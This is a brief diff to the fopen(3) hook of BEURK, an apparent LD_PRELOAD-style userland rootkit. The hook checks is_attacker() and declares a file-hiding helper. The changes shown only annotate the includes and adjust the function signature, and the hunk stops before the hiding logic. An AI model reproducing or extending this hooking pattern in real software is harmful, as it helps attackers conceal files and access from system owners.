@@ -18,12 +18,14 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <errno.h>
-#include "beurk.h"
+#include <errno.h> /* errno, ENOENT */
+#include "beurk.h" /* is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_FOPEN() */
+#include "hooks.h" /* prototype, FILE */
 
 // TODO: is_procnet()
 
-FILE *fopen(const char *path, const char *mode) {
+FILE *fopen(const char *__restrict path, const char *mode) {
     DEBUG(D_INFO, "called fopen(3) hook");
 
     if (is_attacker())
